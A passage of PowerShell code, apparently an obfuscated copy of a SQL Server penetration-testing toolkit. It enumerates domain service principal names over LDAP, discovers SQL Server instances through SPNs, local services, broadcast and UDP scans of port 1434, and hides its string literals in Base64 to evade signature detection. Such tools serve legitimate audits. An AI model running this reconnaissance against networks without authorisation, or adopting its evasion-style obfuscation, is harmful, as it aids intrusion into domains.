            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAbwBtAGEAaQBuACAAUwBQAE4AcwAuAC4ALgA=')))
        }
        $TableDomainSpn = New-Object -TypeName System.Data.DataTable
        $null = $TableDomainSpn.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGkAZAA='))))
        $null = $TableDomainSpn.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))
        $null = $TableDomainSpn.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBDAG4A'))))
        $null = $TableDomainSpn.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))))
        $null = $TableDomainSpn.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TableDomainSpn.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAG4A'))))
        $null = $TableDomainSpn.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A'))))
        $null = $TableDomainSpn.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $TableDomainSpn.Clear()
    }
    Process
    {
        try
        {
            $SpnFilter = ''
            if($DomainAccount)
            {
                $SpnFilter = "(objectcategory=person)(SamAccountName=$DomainAccount)"
            }
            if($ComputerName)
            {
                $ComputerSearch = "$ComputerName`$"
                $SpnFilter = "(objectcategory=computer)(SamAccountName=$ComputerSearch)"
            }
            $SpnResults = Get-DomainObject -LdapFilter "(&(servicePrincipalName=$SpnService*)$SpnFilter)" -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential
            $SpnResults | % -Process {
                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(' ')
                [string]$SidString = $SidBytes -replace ' ', ''
                foreach ($item in $($_.properties.serviceprincipalname))
                {
                    $SpnServer = $item.split('/')[1].split(':')[0].split(' ')[0]
                    $SpnService = $item.split('/')[0]
                    if ($_.properties.lastlogon)
                    {
                        $LastLogon = [datetime]::FromFileTime([string]$_.properties.lastlogon).ToString('g')
                    }
                    else
                    {
                        $LastLogon = ''
                    }
                    $null = $TableDomainSpn.Rows.Add(
                        [string]$SidString,
                        [string]$_.properties.samaccountname,
                        [string]$_.properties.cn,
                        [string]$SpnService,
                        [string]$SpnServer,
                        [string]$item,
                        $LastLogon,
                        [string]$_.properties.description
                    )
                }
            }
        }
        catch
        {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
        }
    }
    End
    {
        if ($TableDomainSpn.Rows.Count -gt 0)
        {
            $TableDomainSpnCount = $TableDomainSpn.Rows.Count
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$TableDomainSpnCount SPNs found on servers that matched search criteria."
            }
            Return $TableDomainSpn
        }
        else
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAgAFMAUABOAHMAIABmAG8AdQBuAGQALgA=')))
        }
    }
}
function Get-DomainObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,
        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP Filter.')]
        [string]$LdapFilter = '',
        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP path.')]
        [string]$LdapPath,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Maximum number of Objects to pull from AD, limit is 1,000 .')]
        [int]$Limit = 1000,
        [Parameter(Mandatory = $false,
        HelpMessage = 'scope of a search as either a base, one-level, or subtree search, default is subtree.')]
        [ValidateSet('Subtree','OneLevel','Base')]
        [string]$SearchScope = 'Subtree'
    )
    Begin
    {
        if($Username -and $Password)
        {
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($Username, $secpass)
        }
        if ($DomainController)
        {
            if(-not $Username){
                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAgAHUAcwBlAHIAbgBhAG0AZQAgAGEAbgBkACAAcABhAHMAcwB3AG8AcgBkACAAbQB1AHMAdAAgAGIAZQAgAHAAcgBvAHYAaQBkAGUAZAAgAHcAaABlAG4AIABzAGUAdAB0AGkAbgBnACAAYQAgAHMAcABlAGMAaQBmAGkAYwAgAGQAbwBtAGEAaQBuACAAYwBvAG4AdAByAG8AbABsAGUAcgAuAA==')))
                Break
            }
            try {
                $objDomain = (New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController", $Credential.UserName, $Credential.GetNetworkCredential().Password).distinguishedname
            }catch{
                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAAZgBhAGkAbABlAGQALgA=')))
            }
            if($LdapPath)
            {
                $LdapPath = '/'+$LdapPath+','+$objDomain
                $objDomainPath = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController$LdapPath", $Credential.UserName, $Credential.GetNetworkCredential().Password
            }
            else
            {
                $objDomainPath = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController", $Credential.UserName, $Credential.GetNetworkCredential().Password
            }
            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
        }
        else
        {
            $objDomain = ([ADSI]'').distinguishedName
            if($LdapPath)
            {
                $LdapPath = $LdapPath+','+$objDomain
                $objDomainPath  = [ADSI]"LDAP://$LdapPath"
            }
            else
            {
                $objDomainPath  = [ADSI]''
            }
            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
        }
        $objSearcher.PageSize = $Limit
        $objSearcher.Filter = $LdapFilter
        $objSearcher.SearchScope = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAdAByAGUAZQA=')))
    }
    Process
    {
        try
        {
            $objSearcher.FindAll() | % -Process {
                $_
            }
        }
        catch
        {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
        }
    }
    End
    {
    }
}
Function  Get-SQLInstanceDomain
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Performs UDP scan of servers managing SQL Server clusters.')]
        [switch]$CheckMgmt,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Preforms a DNS lookup on the instance.')]
        [switch]$IncludeIP,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 3
    )
    Begin
    {
        $TblSQLServerSpns = New-Object -TypeName System.Data.DataTable
        $null = $TblSQLServerSpns.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblSQLServerSpns.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblSQLServerSpns.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQQBjAGMAbwB1AG4AdABTAGkAZAA='))))
        $null = $TblSQLServerSpns.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQQBjAGMAbwB1AG4AdAA='))))
        $null = $TblSQLServerSpns.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQQBjAGMAbwB1AG4AdABDAG4A'))))
        $null = $TblSQLServerSpns.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))))
        $null = $TblSQLServerSpns.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAG4A'))))
        $null = $TblSQLServerSpns.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A'))))
        $null = $TblSQLServerSpns.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        if($IncludeIP)
        {
            $null = $TblSQLServerSpns.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))))
        }
    }
    Process
    {
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAGEAYgBiAGkAbgBnACAAUwBQAE4AcwAgAGYAcgBvAG0AIAB0AGgAZQAgAGQAbwBtAGEAaQBuACAAZgBvAHIAIABTAFEATAAgAFMAZQByAHYAZQByAHMAIAAoAE0AUwBTAFEATAAqACkALgAuAC4A')))
        $TblSQLServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAFMAUQBMACoA'))) -SuppressVerbose | ? -FilterScript {
            $_.service -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAFMAUQBMACoA')))
        }
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBpAG4AZwAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABpAG4AcwB0AGEAbgBjAGUAcwAgAGYAcgBvAG0AIABTAFAATgBzAC4ALgAuAA==')))
        $TblSQLServers |
        % -Process {
            $Spn = $_.Spn
            $Instance = $Spn.split('/')[1].split(':')[1]
            $Value = 0
            if([int32]::TryParse($Instance,[ref]$Value))
            {
                $SpnServerInstance = $Spn -replace ':', ','
            }
            else
            {
                $SpnServerInstance = $Spn -replace ':', '\'
            }
            $SpnServerInstance = $SpnServerInstance -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAFMAUQBMAFMAdgBjAC8A'))), ''
            $TableRow = @([string]$_.ComputerName,
                [string]$SpnServerInstance,
                $_.UserSid,
                [string]$_.User,
                [string]$_.Usercn,
                [string]$_.Service,
                [string]$_.Spn,
                $_.LastLogon,
                [string]$_.Description)
            if($IncludeIP)
            {
                try 
                {
                    $IPAddress = [Net.DNS]::GetHostAddresses([String]$_.ComputerName).IPAddressToString
                    if($IPAddress -is [Object[]])
                    {
                        $IPAddress = $IPAddress -join ", "
                    }
                }
                catch 
                {
                    $IPAddress = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAuADAALgAwAC4AMAA=')))
                }
                $TableRow += $IPAddress
            }
            $null = $TblSQLServerSpns.Rows.Add($TableRow)
        }
        if($CheckMgmt)
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAGEAYgBiAGkAbgBnACAAUwBQAE4AcwAgAGYAcgBvAG0AIAB0AGgAZQAgAGQAbwBtAGEAaQBuACAAZgBvAHIAIABTAGUAcgB2AGUAcgBzACAAbQBhAG4AYQBnAGkAbgBnACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAGMAbAB1AHMAdABlAHIAcwAgACgATQBTAFMAZQByAHYAZQByAEMAbAB1AHMAdABlAHIATQBnAG0AdABBAFAASQApAC4ALgAuAA==')))
            $TblMgmtServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential  -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAFMAZQByAHYAZQByAEMAbAB1AHMAdABlAHIATQBnAG0AdABBAFAASQA='))) -SuppressVerbose |
            ? -FilterScript {
                $_.ComputerName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuACoA')))
            } |
            select -Property ComputerName -Unique |
            sort -Property ComputerName
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAZgBvAHIAbQBpAG4AZwAgAGEAIABVAEQAUAAgAHMAYwBhAG4AIABvAGYAIABtAGEAbgBhAGcAZQBtAGUAbgB0ACAAcwBlAHIAdgBlAHIAcwAgAHQAbwAgAG8AYgB0AGEAaQBuACAAbQBhAG4AYQBnAGUAZAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABpAG4AcwB0AGEAbgBjAGUAcwAuAC4ALgA=')))
            $TblMgmtSQLServers = $TblMgmtServers |
            select -Property ComputerName -Unique |
            Get-SQLInstanceScanUDP -UDPTimeOut $UDPTimeOut
        }
    }
    End
    {
        if($CheckMgmt)
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBpAG4AZwAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABpAG4AcwB0AGEAbgBjAGUAcwAgAGYAcgBvAG0AIAB0AGgAZQAgAFUARABQACAAcwBjAGEAbgAuAC4ALgA=')))
            $Tbl1 = $TblMgmtSQLServers |
            select -Property ComputerName, Instance |
            sort -Property ComputerName, Instance
            $Tbl2 = $TblSQLServerSpns |
            select -Property ComputerName, Instance |
            sort -Property ComputerName, Instance
            $Tbl3 = $Tbl1 + $Tbl2
            $InstanceCount = $Tbl3.rows.count
            Write-Verbose -Message "$InstanceCount instances were found."
            $Tbl3
        }
        else
        {
            $InstanceCount = $TblSQLServerSpns.rows.count
            Write-Verbose -Message "$InstanceCount instances were found."
            $TblSQLServerSpns
        }
    }
}
Function  Get-SQLInstanceLocal
{
    Begin
    {
        $TblLocalInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUA'))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAdABoAA=='))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBBAGMAYwBvAHUAbgB0AA=='))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAA=='))))
    }
    Process
    {
        $SqlServices = Get-SQLServiceLocal | ? -FilterScript {
            $_.ServicePath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHEAbABzAGUAcgB2AHIALgBlAHgAZQAqAA==')))
        }
        $SqlServices |
        % -Process {
            $ComputerName = [string]$_.ComputerName
            $DisplayName = [string]$_.ServiceDisplayName
            if($DisplayName)
            {
                $Instance = $ComputerName + '\' +$DisplayName.split('(')[1].split(')')[0]
                if($Instance -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcAE0AUwBTAFEATABTAEUAUgBWAEUAUgA='))))
                {
                    $Instance = $ComputerName
                }
            }
            else
            {
                $Instance = $ComputerName
            }
            $null = $TblLocalInstances.Rows.Add(
                [string]$_.ComputerName,
                [string]$Instance,
                [string]$_.ServiceDisplayName,
                [string]$_.ServiceName,
                [string]$_.ServicePath,
                [string]$_.ServiceAccount,
            [string]$_.ServiceState)
        }
    }
    End
    {
        $LocalInstanceCount = $TblLocalInstances.rows.count
        Write-Verbose -Message "$LocalInstanceCount local instances where found."
        $TblLocalInstances
    }
}
function Get-SQLInstanceScanUDP
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$ComputerName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 2,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TableResults = New-Object -TypeName system.Data.DataTable -ArgumentList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGIAbABlAA==')))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAE4AYQBtAGUA'))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIASQBQAA=='))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABDAFAAUABvAHIAdAA='))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBWAGUAcgBzAGkAbwBuAA=='))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEMAbAB1AHMAdABlAHIAZQBkAA=='))))
    }
    Process
    {
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message " - $ComputerName - UDP Scan Start."
        }
        if ($ComputerName -ne '')
        {
            try
            {
                $IPAddress = [System.Net.Dns]::GetHostAddresses($ComputerName)
                $UDPClient = New-Object -TypeName System.Net.Sockets.Udpclient
                $UDPTimeOutMilsec = $UDPTimeOut * 1000
                $UDPClient.client.ReceiveTimeout = $UDPTimeOutMilsec
                $UDPClient.Connect($ComputerName,0x59a)
                $UDPPacket = 0x03
                $UDPEndpoint = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                $UDPClient.Client.Blocking = $true
                [void]$UDPClient.Send($UDPPacket,$UDPPacket.Length)
                $BytesRecived = $UDPClient.Receive([ref]$UDPEndpoint)
                $Response = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')
                $values = @{}
                for($i = 0; $i -le $Response.length; $i++)
                {
                    if(![string]::IsNullOrEmpty($Response[$i]))
                    {
                        $values.Add(($Response[$i].ToLower() -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBcAFcAXQA='))), ''),$Response[$i+1])
                    }
                    else
                    {
                        if(![string]::IsNullOrEmpty($values.'tcp'))
                        {
                            if(-not $SuppressVerbose)
                            {
                                $DiscoveredInstance = "$ComputerName\"+$values.'instancename'
                                Write-Verbose -Message "$ComputerName - Found: $DiscoveredInstance"
                            }
                            $null = $TableResults.rows.Add(
                                [string]$ComputerName,
                                [string]"$ComputerName\"+$values.'instancename',
                                [string]$values.'instancename',
                                [string]$IPAddress,
                                [string]$values.'tcp',
                                [string]$values.'version',
                            [string]$values.'isclustered')
                            $values = @{}
                        }
                    }
                }
                $UDPClient.Close()
            }
            catch
            {
            }
        }
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message " - $ComputerName - UDP Scan Complete."
        }
    }
    End
    {
        $TableResults
    }
}
function Get-SQLInstanceBroadcast 
{
    [CmdletBinding()]
    Param(
            [Parameter(Mandatory = $false,
        HelpMessage = 'This will send a UDP request to each of the identified SQL Server instances to gather more information..')]
        [switch]$UDPPing
    )
    Begin
    {
        $TblSQLServers = New-Object -TypeName System.Data.DataTable
        $null = $TblSQLServers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblSQLServers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblSQLServers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEMAbAB1AHMAdABlAHIAZQBkAA=='))))
        $null = $TblSQLServers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))))        
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGkAZABlAG4AdABpAGYAeQAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABpAG4AcwB0AGEAbgBjAGUAcwAgAG8AbgAgAHQAaABlACAAYgByAG8AYQBkAGMAYQBzAHQAIABkAG8AbQBhAGkAbgAuAA==')))
    }
    Process
    {
        try {
            $Instances = [System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()
            $Instances | 
            % {
                [string]$InstanceTemp =  $_.InstanceName
                if($InstanceTemp){
                    [string]$InstanceName = $_.Servername + "\" + $_.InstanceName
                }else{
                    [string]$InstanceName = $_.Servername 
                }
                [string]$ComputerName = $_.Servername
                [string]$IsClustered  = $_.IsClustered
                [string]$Version      = $_.Version
                $TblSQLServers.Rows.Add($ComputerName, $InstanceName, $IsClustered, $Version) | Out-Null
            }
        }
        catch{
            $ErrorMessage = $_.Exception.Message
            echo -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABPAHAAZQByAGEAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            echo -Message " Error: $ErrorMessage"     
        }
    }
    End
    {               
        $InstanceCount = $TblSQLServers.Rows.Count
        Write-Verbose "$InstanceCount SQL Server instances were found."
        if($UDPPing){
            Write-Verbose "Performing UDP ping against $InstanceCount SQL Server instances."
            $TblSQLServers |
            %{
                $CurrentComputer = $_.ComuterName                
                Get-SQLInstanceScanUDP -ComputerName $_.ComputerName -SuppressVerbose
            }
        }         
        if(-not $UDPPing){
            $TblSQLServers
        }
    }
}
function Get-SQLInstanceScanUDPThreaded
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$ComputerName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 2,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TableResults = New-Object -TypeName system.Data.DataTable -ArgumentList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGIAbABlAA==')))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAE4AYQBtAGUA'))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIASQBQAA=='))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABDAFAAUABvAHIAdAA='))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBWAGUAcgBzAGkAbwBuAA=='))))
        $null = $TableResults.columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEMAbAB1AHMAdABlAHIAZQBkAA=='))))
        $TableResults.Clear()
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
            $PipelineItems = $PipelineItems + $ProvideInstance
        }
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $ComputerName = $_.ComputerName
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message " - $ComputerName - UDP Scan Start."
            }
            if ($ComputerName -ne '')
            {
                try
                {
                    $IPAddress = [System.Net.Dns]::GetHostAddresses($ComputerName)
                    $UDPClient = New-Object -TypeName System.Net.Sockets.Udpclient
                    $UDPTimeOutMilsec = $UDPTimeOut * 1000
                    $UDPClient.client.ReceiveTimeout = $UDPTimeOutMilsec
                    $UDPClient.Connect($ComputerName,0x59a)
                    $UDPPacket = 0x03
                    $UDPEndpoint = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                    $UDPClient.Client.Blocking = $true
                    [void]$UDPClient.Send($UDPPacket,$UDPPacket.Length)
                    $BytesRecived = $UDPClient.Receive([ref]$UDPEndpoint)
                    $Response = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')
                    $values = @{}
                    for($i = 0; $i -le $Response.length; $i++)
                    {
                        if(![string]::IsNullOrEmpty($Response[$i]))
                        {
                            $values.Add(($Response[$i].ToLower() -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBcAFcAXQA='))), ''),$Response[$i+1])
                        }
                        else
                        {
                            if(![string]::IsNullOrEmpty($values.'tcp'))
                            {
                                if(-not $SuppressVerbose)
                                {
                                    $DiscoveredInstance = "$ComputerName\"+$values.'instancename'
                                    Write-Verbose -Message " - $ComputerName - Found: $DiscoveredInstance"
                                }
                                $null = $TableResults.rows.Add(
                                    [string]$ComputerName,
                                    [string]"$ComputerName\"+$values.'instancename',
                                    [string]$values.'instancename',
                                    [string]$IPAddress,
                                    [string]$values.'tcp',
                                    [string]$values.'version',
                                [string]$values.'isclustered')
                                $values = @{}
                            }
                        }
                    }
                    $UDPClient.Close()
                }
                catch
                {
                }
            }
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message " - $ComputerName - UDP Scan End."
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TableResults
    }
}
Function  Get-SQLInstanceFile
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true,
        HelpMessage = 'The file path.')]
        [string]$FilePath
    )
    Begin
    {
        $TblFileInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblFileInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblFileInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
    }
    Process
    {
        if(Test-Path $FilePath)
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAaQBuAGcAIABpAG4AcwB0AGEAbgBjAGUAcwAgAGYAcgBvAG0AIABmAGkAbABlACAAcABhAHQAaAAuAA==')))
        }
        else
        {
            echo -InputObject $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQAgAHAAYQB0AGgAIABkAG8AZQBzACAAbgBvAHQAIABhAHAAcABlAGEAcgAgAHQAbwAgAGIAZQAgAHYAYQBsAGkAZAAuAA==')))
            break
        }
        gc -Path $FilePath |
